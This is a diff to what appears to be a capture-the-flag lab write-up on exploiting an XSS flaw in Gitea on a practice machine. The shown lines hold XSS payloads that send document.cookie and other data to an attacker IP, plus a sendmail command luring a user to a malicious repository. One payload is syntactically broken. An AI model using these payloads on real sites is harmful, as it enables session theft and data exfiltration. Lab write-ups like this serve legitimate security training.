@@ -435,11 +435,11 @@ We again find xss vuln to exploit, but the cookie used in gitea are all http onl
 
 ## 4. use gitea xss vuln to query website
 ```js
-// try to get cookie but fail
+// try to get cookie but failed
 <a href="javascript:fetch('http://10.10.14.56:443/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>
 
 // send mail to jobert
-echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/l4tmur" | sendmail jobert@cat.htb
+axel@cat:~$ echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/test" | sendmail jobert@cat.htb
 
 // I think this is useful but too long
 <script> fetch('http://10.10.14.56:443', { method: 'POST', body:encodeURIComponent(btoa(unescape(encodeURIComponent(data) }); </script>
@@ -489,8 +489,6 @@ Accept-Encoding: gzip, deflate
 Origin: http://localhost:3000
 Connection: keep-alive
 Priority: u=4
-
-
 
 ==== index.php =====
 ┌──(kali㉿kali)-[~/Desktop/htb]
